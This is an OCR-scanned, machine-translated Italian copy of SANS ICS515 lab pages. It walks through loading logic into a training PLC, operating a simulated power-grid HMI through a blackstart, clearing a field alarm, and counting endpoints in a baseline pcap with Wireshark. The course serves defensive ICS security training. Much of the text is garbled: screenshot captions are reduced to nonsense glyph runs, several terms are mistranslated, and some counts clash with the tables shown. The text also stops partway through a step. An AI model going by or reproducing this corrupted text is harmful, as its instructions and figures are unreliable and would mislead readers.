 Gli analisti dovrebbero essere sempre consapevoli di ciò che è pubblicamente disponibile sui loro asset. Le informazioni pubbliche spesso necessitano di molte analisi automatizzate e umane per essere utili. Tuttavia, conoscendo la tua infrastruttura e organizzazione, come l'intervallo IP che stai utilizzando, puoi creare avvisi molto utili in Shodan per essere avvisato quando le informazioni sulle tue risorse appaiono online. Puoi inoltre visualizzare un set di dati molto più ricco dal database Shodan per essere sempre informato su ciò che gli avversari possono scoprire su di te online. Disporre di queste informazioni è la chiave per ridurre lo spazio di attacco alle informazioni ed eliminare facili percorsi di accesso alla tua organizzazione da parte degli avversari.

© 2021, Robert M. Lee Lab 1.4-12
 oh
 eh
 7. ff} * @® ® ouvevveueseuuewbeuwsweewwewwes www
 ahi w&
 ao Ww
 Questo esercizio utilizzerà la macchina virtuale Windows e il kit SANS I.C.S.515 Student. Per la risoluzione dei problemi fare riferimento ai passaggi dell'Esercizio 1.1 (inclusa la modifica dell'IP nell'intervallo 169.254.x.x/16, se necessario).
 Lab 2.1- Funzionamento del processo
 Caricare la logica operativa nel PLC
 Connettiti e visualizza i settori operativi tramite un HMI
 Comprendere le dipendenze dei processi, il normale funzionamento del sistema, le operazioni di emergenza e le modalità di errore
 Compito: caricare la logica operativa nel PLC
 1. Aprire la VM Windows 2. Caricare il file della logica operativa nel PLC
 3.

> Nella cartella ics515 individuare: “I.C.S.515 Site Acceptance Test V1.ckp
> Fare doppio clic sul file per avviare il software di programmazione CLICK con il progetto
 Software di programmazione CLICK {Versione 3.01) - |CS515V8 per schede di produzione.ckp - [Programma principale] = oa x Fie = [pHomes ft Visualizza Configurazione Programma narucion Finestra monitor PLC Hep i ence hail
 BOR Gp 4 Gino {Rung Commenti i ivi § a addessPicker = Parrucca 2 Ofine | FAsau
< ise He Aline 1 Ades Consenots © Riferimento incrociato Wy Dec Modalità FB oeta view - yrse Soprannomi Softee fej Controllo sintassi POPE GR) Oc nae
 Programma Funzione PLC Md inizializza a
~ Mg] Comando remoto
~ tag TransAlorms J Trasmissione gy TranStates
_ fF Programma di interruzione
 @ Selettore indirizzi
@ Modifica commenti ramo LD Informazioni sul programma locale
 Inizializzare
 o Contatto sul bordo
& Confrontare
 t Eh enstate
 Chiama, generazione di una volta
 Una chiamata di controllo della sintassi
'Visualizzazione riferimento incrociato iG > Gen_Fuel_Controt eB] Monitor BY monitor di stato
 tutto, 2 censtarm
 Visualizzazione data FB Visualizzazione dati EB! v
 Biinene
 Wbioteger2words) Virgola mobile He (Etec (Alasci ——---_——oonovaoon.—C2-0icu,
 Quando si apre l'applicazione, trova nel menu in alto l'icona con la freccia rossa verso il basso che serve per scrivere un progetto in un PLC

© 2021, Robert M. Lee Lab2.1- 1 ows seit wb ww
 vo wv © wo
 ss FS FF FT we wT Ww
 Lab 2.1-— Funzionamento del processo
 e Caricare la logica operativa nel PLC
 e Connettersi e visualizzare i settori operativi tramite un HMI
 e Comprendere le dipendenze dei processi, il normale funzionamento del sistema, le operazioni di emergenza e le modalità di errore
 Questo esercizio utilizzerà la macchina virtuale Windows e il kit SANS I.C.S.515 Student. Per la risoluzione dei problemi fare riferimento ai passaggi dell'Esercizio 1.1 (inclusa la modifica dell'IP nell'intervallo 169.254.x.x/16, se necessario).
 Compito: caricare la logica operativa nel PLC
 1. Aprire la VM Windows 2. Caricare il file della logica operativa nel PLC
> Nella cartella ics515 individuare: “I.C.S.515 Site Acceptance Test V1.ckp
> Fare doppio clic sul file per avviare il software di programmazione CLICK con il progetto
 Software di programmazione CLICK (Versione 3,01) - I.C.S.515V8 for Production Boards.ckp - [Programma principale] - a x erp ons i BOR Gem an + Curr |) Rung Commenti
 Visualizzazione deta FB della mia modalità DC - RB CpPCE ret La States af
 Programma Funzione PLC
 avvio
 Ney RemoteCommw0 Ay TransAlarms gi Trasmissione gi TrenStates Programma di interruzione BP
© Selettore indirizzi
'gf Modifica commenti rung
<x) Informazioni sul programma locale Controllo della sintassi 16) Visualizzazione dei riferimenti incrociati Monitor EQ Monitor di stato AB
 Chiama, Inizializza chiamata,

[oem Geni States
 Tutto,
—— Generazione
 Cal
> Controllo carburante gen
 Contatto GB Contatto (NO)
 Contatto GB (NO)
 un contatto sul bordo

[Confronto EB
 3. Quando si apre l'applicazione, trova nel menu in alto l'icona con la freccia rossa verso il basso che viene utilizzata
 Scrivere un progetto in un PLC

© 2021, Robert M. Lee
 Lab 2.1- 1 Apparirà una schermata di connessione, potrebbe essere necessario selezionare Ethernet nel menu a discesa Tipo di porta e potrebbe essere necessario selezionare l'adattatore Intel 82574 (Asix come viene presentato tramite il Bridge alla VM) nel menu Adattatore di rete giù. Se non vedi l'adattatore Intel nel menu a discesa, dovrai rivedere le impostazioni di rete e assicurarti che l'adattatore sia connesso all'host, non
 eo
 o
 la VM. Dovresti vedere un PLC che è stato scoperto.
 Connettersi al PLC CLIC

"Cambia hub."
«Questo computer eee ss ke r
" Bthemet o Ethernet i Connessione diretta
 Posizione del PLC CLICK di destinazione
 Tipo di porta: Ethernet =
@ nella stessa LAN (scansiona automaticamente tutti i PLC CLICK nella LAN.)
 Adattatore di rete: collega questa LAN (è necessario allocare l'IP e il numero di porta 5 Reeser By) Oouside (inserire l'indirizzo 1P e por manualmente.) tres! | Nome PLC Indirizzo BP Maschera sottorete - Numero parte Stato modalità firmware. Mac Papà: «192. 168.0.8: oe
 Sf Go00 TEE

}i92,168.0.10 —1255.255.255.0 _|C2010PU [ver3.00 | Maschera di sottorete: 255.255.255.0
 Gateway predefinito: 0.0.0.0
 Fare clic sul pulsante Connetti. Immettere la password "sansics123".
 eo
 fe

.3 °e rs)
 UN]
 Quando richiesto, è possibile continuare con l'esecuzione di una modifica in fase di esecuzione oppure scegliere di posizionare l'interruttore del PLC in posizione STOP. Se si procede con la modifica in fase di esecuzione, scegliere l'opzione STOP PLC e Continua, che richiederà quindi di tornare in RUN dopo che il progetto è stato scritto
 il PLC. Ciò ti risparmia semplicemente i passaggi necessari per attivare l'interruttore sul PLC.

© 2021, Robert M. Lee
 Laboratorio 2.1-2
 7]
 C
 3

>
 3
 Mel oY WD © WwW ww WY noi noi wewewwe noi ww
 oovs FF OU YD UF WD W
 rito Progetto nel PC PLC
 Nome progetto: {I.C.S.S15V8 for Production Boards Dimensioni programma (totale: 8.000 passaggi) Dimensioni WiProgram: 1.173 passaggi (14,66%) Area libera: 6.827 passaggi (85,34%)
 o 8.000
 File progetto (Totale: 262.144 byte) WiProject Fie Suze 35.416 byte ( 15,03 %) Avea libera: 222.728 byte ( 84,97 %)

°262.144
 Ultimo aggiornamento: 2ul 08,2021, 14:35:55

(Un file di progetto Scrivi nel PLC Abilitando questa opzione, il file di progetto verrà scaricato iWrite) nel PLC. Se desideri disabilitare il caricamento del progetto{Leggi), disabilita questa opzione.
 8. È possibile chiudere il software di programmazione CLICK
 Attività ~ Avviare l'interfaccia operatore uomo-macchina (HMI)
 1.Aprire il server MatrikonOPC per l'applicazione Modbus
 Al Apes
 Racuments Satan Web More

® lectez tt peronan 3
 Documenti

= Guida di avvio rapido del server MatrikonOPC per Modbus

'= Manuale utente MatrikonOPc Server per Modbus
 Suggerimenti per la ricerca 2 server matiikonOPC per modbus - vedere
-_
 P server matrikonOPC per modbud
 2. Selezionare Sì alla richiesta di sicurezza UAC 3. Selezionare File dal menu dell'applicazione 4. Selezionare la configurazione di importazione
 PLC

[ez-o1ceu | Nome progetto: [I.C.S.515 Mfg V3 per schede di produzione | Dimensioni del programma (totale: 8.000 passaggi)
 Tipo di processore:
 Dimensioni BiProgram: 265 stens{ 3,31 %) iFree Area: 7.738 passi (96,69 %) t) 8.000
 File di progetto (totale: 262.144 byte)
 File WiProject Sue 17.456 byte (6,65 %) Aree WiFree: 244.688 byte ( 93,35 %) t) 262.144 Ultimo aggiornamento: 3 07,2021, 19:33:48 ARUN Ora Modifica
 Abilitando questa opzione, il programma verrà scaricato nel PLC senza portare il PLC in STOP
 modalità.
[Ce]
 Server MatrikonOPC per Modbus

@ Server MatrikonOPC per Modbus - {Locathost
 File | Guida alla finestra di visualizzazione di Edt
 1) Nuova configurazione
 a acc Locale *,
 Uscita
 importa configurazione... Esporta configurazione.
 voi

}
 Server OPC matrici EB per Mota

© 2021, Robert M. Lee
 Lab 2.1- 3 5. Passare a Desktop\ics515\Seleziona — 1C$515_Matrikon_Config

] File adatta finestra visualizzazioni _ Hele

© gf Brewer comguavon x a nL Tene + Deiaog > Sudan Fer STS Sen 2 oH om Now ee -30
 accesso fe Gack

© C8815 Matikon Conf
(Desktop 18515, Configurazione Matilion
 6.
 iC Conferma x '|

\ Stai per sostituire la configurazione attualmente attiva.
 Vuoi esportarlo per un uso successivo prima di procedere?
 Annulla
 7. Fare clic con il pulsante destro del mouse su MatrikonOPC Server per Modbus > Persistenza > imposta come predefinito
@ MatrikonOPC Server per Modbus - (Pagina iniziale]

@ Guida della finestra di visualizzazione file
 un 2

@ tx - @ Bie en
 Posizione | MyMatrikonOPC » Host locale » MatrikenOPCServerperModbus >
 8. Chiudere l'applicazione MatrikonOPC Server per Modbus 9. Fare doppio clic sull'icona Riavvio servizio Matrikon per arrestare e avviare il servizio Matrikon
 11. Se si riceve un avviso di licenza che indica un limite di 2 ore, selezionare OK.

© 2021, Robert M. Lee Lab 2.1- 4

@ a ® &® @® &
 eo

®2@oeennhemnheeeeteneaee
 Questa notifica verrà inviata sette giorni dopo il lancio iniziale della macchina virtuale Windows del corso, pertanto non dovrebbe essere visualizzata negli studenti in classe, tuttavia gli studenti su richiesta potrebbero riscontrarla. Tutto continuerà a funzionare e tutti i laboratori funzioneranno, tuttavia, dopo il periodo di licenza di 7 giorni, il runtime dell'HMI rimarrà aperto per periodi di 2 ore e poi si chiuderà, richiedendo il riavvio quando
 VuuUuvUeuUbebe pecore
 uv wo Ww

)

\P

)
 wo Ww¢
 necessario per un laboratorio.
 FactoryTaik View ME Station (limite di 2 ore]
 È stata trovata una licenza FactoryTalk View ME Station. Il runtime si chiuderà
 giù in due ore.
 12. Fare clic su Sì nel prompt e quindi attendere: stanno accadendo cose belle, potrebbero essere necessari 10 secondi, sii paziente
 Sostituisci la directory di sistema locale
 13. Fare clic su Sì nel prompt dell'UAC
 La directory di sistema FactoryTalk dell'applicazione per utenti e policy verrà caricata su questo terminale. La FactoryTalk System Directory esistente verrà archiviata e verrà ripristinata automaticamente dopo la chiusura dell'applicazione runtime.
 Chiudere tutti gli altri programmi che stanno attualmente accedendo alla directory FactoryTalk locale. Selezionare SÌ per continuare o selezionare NO per annullare il caricamento di questa applicazione.
 Nessun SE8}
 Controllo dell'account utente
 Vuoi consentire a questa app di apportare modifiche al tuo dispositivo? ;

“BE UnpackMeR.dll in FactoryTalk Linx
 Editore verificato: Rockwell Automation Origine del file: disco rigido su questo computer
 Mostra più dettagli
 14. Selezionare il pulsante "Esegui applicazione".

© 2021, Robert M. Lee
 Lab2.1-5 15. Mentre l'HMI si carica, passare alla schermata principale — Con gli interruttori sulla scheda in posizione Aperto e l'Intertie aperto, non c'è energia disponibile nel nostro sistema elettrico simulato per servire il carico.
 FactoryTalk View ME Station - 10.00,00.290(Patch 03)
 Applicazione attuale
 I.C.S.515V1.mer
 Carica applicazione Esegui applicazione IF) (F2i
 Impostazioni dell'applicazione
(F3]
 Elimina i file di registro prima dell'esecuzione
(FS)
 Impostazioni del terminale
 SÌ

@ NO

[HMI del sistema di alimentazione Bf - Principale

'Generazione
 Switchyard Transmission it MW Uscita redken Relè di protezione interruttore Aperto Chiuso Aperto Chiuso Reset guasto
\ N me 7S 4 N \ Fe
 Generatore
 1
'11
~T Carico T Min <> Max T 0 T
' N 7 mmm lA _ Richiusura ks é.] ! fra Apri Chiudi
' ZN y ¢ 1 N 4 Q Carica 7 \. Misuratore di potenza (96) 'ns | Min <> Max è come 1ZX e C8
© 2021 SANS'ere) | ee) Made in USA 1 Ps 190 Industry —] \ CDairibaton —

La generazione con punta dell'interruttore di trasmissione è un'arma fondamentale

‘Generatore locale Nott Min per interruttore chiuso Area di generazione Braccio critico
 Generatore locale non al minimo per Steater chiuso Generatore locale Notf Min per interruttore chiuso
 16. Siamo effettivamente in una condizione di “blackstart” e procederemo attraverso una startup. 17. Inizieremo accedendo alla scheda Generazione
 18. Dalla schermata Generazione andremo ad eseguire alcune operazioni manuali iniziali

© 2021, Robert M. Lee
 X
 Laboratorio 2.1-6
 e, www noi OWUUUCTOWOKCOHOKHHOKCHH eS
 19. Verificare che il controllo della valvola del carburante CT sia in Manuale e che il generatore sia in Manuale. In caso contrario, premere il pulsante Manuale in entrambe le aree

|
 Controlli della valvola del carburante CT

@ Modalità manuale O Modalità automatica ™
@® Locale Fare clic su PLC
 1% Aperto © OpenPic
 Locale o Manuale
 Modalità PLC aperto! Modalità i
 Aria in ingresso

@ CT in funzione O AVR in modalità esperto
 OCT interrotto © Modalità manuale —~ Sim 8
 On=UsePB's Start | Manuale di tensione
 Spento = modalità di regolazione dell'avvio automatico
 7 Spento
 a me WR) | 100| Mw
 20. Con entrambe le impostazioni in Manuale, inserire 50 nel campo Setpoint modalità manuale valvola combustibile CT e inserire 100 nel Setpoint modalità manuale turbina a combustione (utilizzando il tastierino numerico per l'immissione dei dati, inserire il valore desiderato e quindi utilizzare la freccia in basso a destra indicando Invio)

é

*Nota* Fare clic su e riconoscere tutti gli allarmi di ripristino rossi; mentre procedi per cancellare gli allarmi durante la procedura di avvio Blackstart in questo laboratorio.
 21. Passare alla scheda Trasmissione e distribuzione e fare clic sull'interruttore verde Generazione intertie, dovrebbe diventare rosso indicando una condizione energizzata.
 Franamissiano | | Tendenze industriali residenziali Accedi igs
 Distribuzione della generazione 14:05:42
 TRASFERIMENTO AUTOBUS

| Interruttore SI della trasmissione Lambda
 j [Fauno] 0 [vedere
 Consumo MW | Consumo MW 0 % ‘ 0 mw ag BS sa
© 2021, Robert M. Lee Lab2.1-7 22. Con la connessione interconnessa chiusa (rosso = energizzata) al sistema elettrico principale più grande, tornare alla schermata Generazione e chiudere l'interruttore del quadro elettrico di generazione
 fs Trasmissione ‘ ‘TiRi2021 Generazioni principali (| gymemision | Tendenze allarmi industriali residenziali Login sono EXIT CT Controlli valvola carburante Generazione Stato interblocco e © tonal Mode Bee) eee | @trterie On
% O Modalità automatica Be Pascal Breaker Permissivi
@ Locale Fare clic su PLE z © Gscecatee Renning
% Apertura © OpanPLc @ Trans. Interruttore chiuso
@Trad. Localizzatore relè di protezione manuale © Controllo carico presente Setpoint di controllo
/ ‘Serie] RIEIN| [-] una turbina a vapore ad aria in ingresso
"ovvero Turbina di Combustione da 100 Mw
@ Cr In esecuzione OAVR Acceso Power Power Power Modalità esperto ©) CT Arrestato @Manval Mode Acceso Generazione consumi Disponibile onstsepss | SBR Tensione Manuale Industiat [0] MW Locale [100] mw Locale [_ 200) ww ot pes. Eb Mie < Modalità — 7 Off = Regolazione avvio automatico Resiterita 77 ] WW intertie 0 MW Intertie 500 nw
—ea Off <a MW) Totale ww Totale 100 mya Totale | 780 Mw
 23. Ora dovresti vedere 100 MW di generazione erogati nell'interconnessione 24. Passare alla scheda Trasmissione e distribuzione e reimpostare il relè di protezione, quindi chiudere il
 Interruttore di trasmissione Lambda
 Principale Genersticn residenziale
 Allarmi industriali
 TRASFERIMENTO AUTOBUS.
 Login
 Puledro ame] |
 rane
 22:35:34 RIT,
 Generazione residenziale
 AUTOBUS DI TRASFERIMENTO,
 Industriale
 Login
 Protezione della trasmissione Lambda
 e. en. ehi

© 2021, Robert M. Lee
 Sal
 7
 recatevi alle 22:45:33.
 Laboratorio 2.1-8
 eo
 eh.
 o
 oe, oe] o om @ oe o ca] oe wo o

°, www wo wo Oo wow wow noi wo noi wy
 oe)

\p TY \p 'py
 vy
 25. Passare alla scheda Residenziale e chiudere la Richiusura
 Trasmissione
 Generazione Allarmi Industriali Residenziali

e distribuzione
 08/07/2024 22:48:39.
 Login
 Via della trota di lago
 26. Prima di iniziare ad aggiungere carico al sistema, tornare alla scheda Generazione e inserire la valvola CT
 Carico attuale Carico massimo
 Controllo in Auto e controllo della Generazione in Regolazione Automatica della Tensione (AVR)
 Trasmissione
 Generazione | |g Distribuzione
 Residenziale
 Controlli della valvola del carburante CT

&
 0
 Controllo locale o OpenPLC
 Sim in modalità esperto 8
 On = Usa PB
 Spento = Avvio automatico
 Di
 O Modalità manuale
@ Modalità automatica
@ Locale Fare clic su PLC
©OpenPLe
 Setpoint modalità manuale
 50

@CTRunning @ AVR attivato
 OCT interrotto © Modalità manuale attivata
 Regolazione del voltaggio
 Aria in ingresso
 Modalità manuale
 yassetpount....

| mw
 27. Ruotare i quadranti dei quadranti Residenziale e Industria verso l'alto per aggiungere carico. Dovresti vedere il generatore MW
 l'uscita aumenta per soddisfare il nuovo carico
 28. Passa alla scheda Tendenze e seleziona Alimentazione, ora se manipoli i quadranti di carico dovresti vedere questo
 aumento/diminuzione del carico visualizzato

© 2021, Robert M. Lee
 Lab 2.1- 9 Trasmissione
e distribuzione
 7/8/2021
 Residenziale Industriale 17:43
 Generazione
 Consumo di energia

(MW) iniziale (MW)
 Intertie - Disponibile vs Supply BB aAvailadie (ww) BB Supply (aw)
 Generazione locale: disponibile rispetto all'offerta
 Vicino
 Raffineria A MW Draw [299 | mw Raffineria B ea ;
 sull'uscita di corrente [99 % oe Sor Maxuw [300 |] uw ae
 30. Navigare attraverso le schermate dei quattro quadranti e fare clic sul pulsante Reimposta allarme per riconoscere gli allarmi precedenti.
 31. Una volta completato, sentiti libero di osservare ulteriori trend, mentre manipoli il sistema attraverso i controlli fisici sulla scheda o attraverso l'HMI.

© 2021, Robert M. Lee Lab 2.1-10

@® @ ®@® ®@ ® ® ® WW ®
 ww wowwwwwww ww wy
 noi noi w
 oe ww G&G ww

“3ee Ww

[se HMI del sistema di alimentazione - Principale _ x
 Trasmissione
e distribuzione
 08/07/2021 17:02:08
 Generazione residenziale Tendenze industriali Login
 USCITA
 Trasmissione
 Switchyard = Configurazione Uscita MW Relè di protezione interruttore rotto Aperto Chiuso Aperto Chiuso Reset guasto N 7 » ¢ N 7 ZN 7 oN Generatore } | S16. /10- oe OTS /o- oO o— T T 1 Richiusura OAS
! ita Apri Chiudi 1 / 1 WANN 5 4 Carica 7 \. Misuratore di potenza(%) | ns) —| Min <> Max 1 ets LA ae? 7 at
© 2021 SANS 99 I ena fa ae Made in the USA i y Lc? 100 Industria I Distribuzione
‘Ora sveglia ‘Ora conferma Messaggio — | 08/07/2021 16:58:10 Interruttore di trasmissione ribaltato 7182021 16:57:25 Allarme critico dell'area di generazione 00/07/2021 16:57:25 Generatore locale NotAt Min per interruttore chiuso 08/07/2024 4: 17:05 Allarme critico area generazione 08/07/2021 16:05 Generatore locale non al minimo per interruttore chiuso 09/07/2021 16.56.55 Generatore locale non al minimo per interruttore chiuso 7112021 16:56:53 Generazione Allarme area critica
 Compito: eseguire un'operazione manuale sul campo
 1. Con il sistema attivo e le suddivisioni residenziali sotto tensione (ovvero le tre case sono illuminate)
 2. Simulare un guasto del sistema di alimentazione (famoso attacco di scoiattolo, incidente d'auto contro un palo, cavi abbattuti a causa di un temporale, ecc.) che provoca una perdita di carico facendo clic sul pulsante di apertura della richiusura della distribuzione sulla scheda.
 3. Dovresti notare che il carico industriale non è influenzato, dovresti anche vedere il cambiamento di stato riflesso sull'HMI
 4. Inoltre è presente un allarme critico nell'HMI, questo stato di allarme impedisce di chiudere la richiusura sul campo (tentare di premere il pulsante di chiusura nell'area residenziale).
 5. Cancellare la condizione di allarme dal campo spingendo l'interruttore Sim 6 su uno stato On e quindi spegnendolo. (Noterai che la condizione di allarme è stata riconosciuta nell'HMI dal campo)
 6. Prova ora a premere il pulsante di chiusura per ripristinare l'alimentazione nell'area residenziale
 7. Quando il sistema è in una condizione di allarme non riconosciuto, in genere è necessaria un'indagine/o un'ispezione per riconoscere l'allarme e riattivare il sistema, nel caso in cui vi fosse un problema di sicurezza sul campo

© 2021, Robert M. Lee Lab2.1- 11 Informazioni aggiuntive
 La scheda SIM può fornire utili controlli manuali nel caso in cui l'HMI dell'operatore non sia disponibile: e Sim 1: controllo della valvola di flusso del carburante del generatore o O=nessun PLC remoto o 1=controllato da PLC remoto Sim 2: valori estate/inverno per relè di protezione o O=Inverno o 1=Estate e Sim 3: Reset Intertie o O=NA o 1=On (se Aperto, chiude) e Sim 4: Ack Generazione Allarmi e Sim 5: Ack Trasmissione Allarmi e Sim 6: Ack Distribuzione Residenziale Allarmi e Sim 7: Riconoscimento distribuzione Allarmi industriali e Sim 8: Modalità esperto o O=Off o 1=On (Generazione di esecuzione con pulsanti Start/Stop)
 Dati di carico: Carico industriale totale 300 MW Raffineria A = 120 MW (40% del carico industriale totale) Raffineria B = 120 MW (40% del carico industriale totale) Carico impianti ausiliari = 60 MW (circa il 20% del carico industriale totale)
 Carico residenziale totale 100 MW
 Informazioni sulla generazione: capacità nominale totale della generazione = 280 MW
 Condizioni operative degne di nota:
 La generazione locale non può servire il carico totale industriale e residenziale, quindi questo sistema è un importatore netto quando è a pieno carico e l'Intertie deve essere chiuso. Se a pieno carico e l'Intertie scatta, il sistema farà scattare il generatore.
 Con l'Intertie chiuso, tutto il carico può essere servito dal sistema elettrico principale senza alcuna generazione locale

*Importante* Il servizio Matrikon potrebbe andare in timeout o bloccarsi e potrebbe essere necessario riavviarlo per stabilire la comunicazione con l'HMI. Fare doppio clic sull'icona sul desktop per riavviare il servizio se l'HMI smette di ricevere gli aggiornamenti dello schermo.

© 2021, Robert M. Lee Lab 2.1 — 12
 fe

=
 4
 Ce
 ft vouvuwveuvewbvbuveweweuweoewe7e
 vo vs vw Ww WwW
 a’ Ss VS VS |
 Noterai che il PLC e la scheda continuano a funzionare indipendentemente dal runtime dell'HMI, tuttavia probabilmente vorrai che il runtime sia attivo e in grado di comunicare mentre esegui i laboratori successivi in ​​cui esamini le comunicazioni di rete.
 Esercizi da asporto
 Comprendere le capacità operative disponibili tramite l'HMI e localmente "sul campo" tramite i controlli manuali sulla scheda. Inoltre, è importante essere consapevoli di come funziona il sistema con le interdipendenze tra produzione di energia, trasmissione, distribuzione e carico industriale, poiché i laboratori successivi inizieranno a
"utilizzare male" il sistema e sapere come si presentano le normali operazioni aiuterà a identificare eventi operativi anomali.

© 2021, Robert M. Lee Lab 2.1- 13
_Lab 2.2 - I.C.S. Analisi del traffico
 aa
 Obiettivi
 e Identificare i dispositivi aziendali e di controllo attraverso i protocolli e le comunicazioni di IT Discovery

*Informazioni sullo scenario* Nel contesto dello scenario, abbiamo una cattura di base dalla raffineria di Calistoga.Come team di sicurezza dobbiamo analizzare l'acquisizione per determinare eventuali informazioni identificative sulle risorse che ci aiuteranno a comprenderne il contesto e i ruoli.
 Questo laboratorio utilizzerà il RELI.C.S. VM. Sul desktop della VM è presente una cartella identificata come C5515. All'interno c'è la cartella calistogarefinery e poi la cartella pcaps che contiene il pacchetto di acquisizione normalops.pcap che verrà utilizzato durante questo laboratorio.
 Domande
 1. Quante risorse Ethernet univoche (non broadcast o multicast) sono presenti sulla rete?
 2. Quante risorse IPv4 univoche (non broadcast o multicast) sono presenti sulla rete? 3. Quali sono i protocolli IT di “discovery” più utili per le informazioni sugli asset presenti in questo pcap?
 4. Quali sono gli indirizzi IP e (se disponibili) quali sono i nomi host delle risorse Enterprise (L4/L5)?

© 2021, Robert M. Lee Lab 2.2-1 5. Quali sono gli indirizzi IP e (se disponibili) quali sono i nomi dei tubi delle risorse OT (L3 e inferiori)? 6. Cosa I.C.S. il fornitore produce il PLC?
© 2021, Robert M. Lee Lab 2.2-2

,
 ee ee ee ee ee | DP Dw Ww wD DP DP Ww Ww
 va
 Attività: identificare gli indirizzi Ethernet, gli indirizzi IP e gli indirizzi I.C.S. Protocolli in small_baseline.pcap
 1. Quante risorse Ethernet univoche (non broadcast o multicast) sono presenti sulla rete? 16

> Inizia il tuo RELI.C.S. VM
> Accedi alla VM

> ACCEDI =reliquie
> PASSWORD = reliquie

> Apri normalops.pcap in Wireshark
> Apri la cartella I.C.S.515 situata sul desktop e poi vai a calistogarefinery > pcaps
> Fare doppio clic su normalops.pcap per aprire il file in Wireshark
 Gat Home Desktop
 I.C.S.515
 piselli calistogarefinery + Q 8 =. = Qox

® Recenti
 wo Ww
 wp
 incidente.pca 196.4MB 2348 + &
%& Peap stellato ° Gt Home normalops.pcap 37.1MB 2339 ok
© Desktop “NN
 Documenti
 I recneethae
 sì
 wp

*Nota* Una volta caricata l'acquisizione, ciò che vedi sullo schermo è il traffico di rete derivante dall'acquisizione, incluso l'ora in cui è stato visualizzato dalla scheda di interfaccia di rete (NIC), la sorgente, la destinazione, il protocollo, la lunghezza e le informazioni di accompagnamento .

>: identifica gli endpoint univoci nel traffico
> Nella parte superiore del pannello Wireshark, fai clic su Statistiche
 ue © Ww © Ww Ww

> Fare clic su Endpoint
 Analizzare
 Gli strumenti wireless di telefonia aiutano a acquisire le proprietà dei file Ctrl+Alt+Maiusc+c Indirizzi risolti
 Gerarchia dei protocolli
 Conversazioni
 Endpoint
 Lunghezze dei pacchetti
 Grafico 1/O
 Tempo di risposta del servizio r
 RUIeN INAATO chiacchierando

© 2021, Robert M. Lee Lab 2.2-3
*Nota* L'opzione Endpoint consente di visualizzare gli indirizzi logici univoci nell'acquisizione di rete ai vari livelli, inclusi l'indirizzo Ethernet, l'indirizzo IP e le porte TCP o UDP

> Registrare il numero di indirizzi Ethernet univoci
*Nota* Wireshark identifica automaticamente l'identificatore univoco organizzativo (OUI), che riprende il file
 primi 3 byte dell'indirizzo Ethernet (o MAC). Per esempio. SiemensN_0d:3d:3f. Puoi disabilitarlo deselezionando la casella Risoluzione nome nell'angolo in basso a sinistra. Quando si registrano gli indirizzi Ethernet univoci, non includerli
 indirizzi multicast e broadcast. Inoltre, puoi ordinarli facendo clic sulla colonna "Indirizzo".
 Ethernet-27 IPv4-23 IPv6-18 TCP-11 UDP-62
 Indirizzo * Pacchetti Byte TxPacchetti TxByte Rx Pacchetti Rx Byte
-Rockwell_5a:72:ce 177.969 26M 89.666 13M 88.303 Rockwell_da:32:12 50.471 6.883k 25.441 3.612 k 25.030 Rockwell_fa:a9:45 29.882 3.336k 14.798 1.678 k 15.084 Rockwell_c5:c5:f2 20 1.200 20 1.200 0
| RealtekS_12:03:b5 14 10k 14 10k ) IPv4mcast_16 10 600 0 i) 10 IPv4mcast_fb 4 400 0 0 - IPv4mcast_fc 8 602 0 0 8 IPv6mcast_Oc 14 10k 0 is] 14 IPv6mcast_16 10 900 0 0 10 IPv6mcast_Fb 4 480 i) 0 4 IPv6mcast_01 :00:02 244 37k 0 0 244 IPv6mcast_01:00:03 12 1,126 it) 0 12 IPv6mcast_ff:3c:b1:88 2 172 0 0 2 IPv6mcast_ff:96:88:9b 2 172 0 ie) 2 Pegatron_8d:59:1e 80 18k 80 18k ) Pegatron_8d:59:1F 16 1.360 16 1.360 0 Dell_3c:53:04 48 6.292 48 6.292 fs) Dell_3c:53:05 28 4.498 28 4.498 è) Dell_3c:53:06 28 4 ,498 28 4.498 0 Dell_3c:53 :07 29 4,651 29 4,651 0 Dell_3¢:53:08 39 5,691 39 5,691 0 Dell_3c:53:09 110 11k 82 8,830 28 Dell_3c:53:0a 89,758 10M 44,506 5,045k 45,2 52 Dell_3c:53:0b 108.874 19M 54.146 9.244k 54.728 Dell_3c:53:0c 30 5.122 30 5.122 it) Broadcast___ 236 3tkK 8H v e risoluzione Limite di visualizzazione Filtro

*Risposta* Esistono 16 indirizzi Ethernet univoci. Ciò non significa che ci sono 16 dispositivi fisici come i computer ma piuttosto 16 schede di interfaccia di rete viste (alcuni dispositivi possono avere più schede di interfaccia).

© 2021, Robert M. Lee
 Laboratorio 2.2-—4
 ynrents#sksfhk_Fsethesehfs fs ® @,

®) sì
 2. Quante risorse IPv4 univoche (non broadcast o multicast) sono presenti sulla rete? 16

> Identificare gli endpoint IPv4 univoci nel traffico
> Nella parte superiore del pannello Wireshark, fai clic su Statistiche
> Fare clic su Endpoint
> Fare clic sulla scheda IPv4
 Ethernet - 27 IPv4 - 23 | IPv6 - 18 TcP - 11 UDP - 62

'Indirizzo _—s* Pacchetti Byte TxPacchetti Tx Byte _Rx Pacchetto 0.0.0.0 36 12k 36 12k 10.10.0.10 8 988 8 988

/10.10.0.20 2 520 2 520

| 10.10.0.30 2 520 2 520 10.10.0.40 2 520 2 520 10.10.0.50 4 1.028 4 1.028
 10.10.1010 79 «7.234 52 4.472 10.10.10.20 59.848 6.681 mila 29.680 3.363 mila 10.10.10.30 108.869 19M 54.143 9.244 mila 10.10.10.40 2 530 2 530

| 10.10.20.10 176.303 26M 88.725 13M 10.10.20.20 29.882 3.336k 14.798 1.678k

| 10.10.20.40 29.882 3.336 mila 14.798 1.678 mila 10.10.20.50 51.923 7.053 mila 26.170 3.700 mila

| 10.10.255.255 88 11k 0 0

| 10.20.20.10 97 12k 97 12k 10.20.40.10 97 12k 97 12k
 169.254.201.178 8 575 8 575

| 169.254.223.2685758575

| 224.0.0.22 10 600 0 0

| 224.0.0.251 4 400 0 0

| 224,0.0.252 8 602 0 0

| 255.255.255.255 102 17k 0 0

*Risposta* Esistono 16 indirizzi IPv4 univoci. 0.0.0.0 è in realtà tecnicamente un indirizzo ma i 169.254 sono indirizzi per quando non è possibile connettersi a DHCP sebbene sia stato configurato per questo. Gli indirizzi che terminano con 255 e iniziano con 224 sono indirizzi multicast e broadcast.

© 2021, Robert M. Lee Lab2.2-5 3. Quali sono i protocolli di “scoperta” IT più utili per le informazioni sulle risorse presenti in questo pcap?
 ARP. MDNS LLMNR DHCP DHCPv6 NetBIOS

> Identificare i protocolli di rilevamento IT più utili effettuando una ricerca nella Gerarchia dei protocolli

> Nella parte superiore
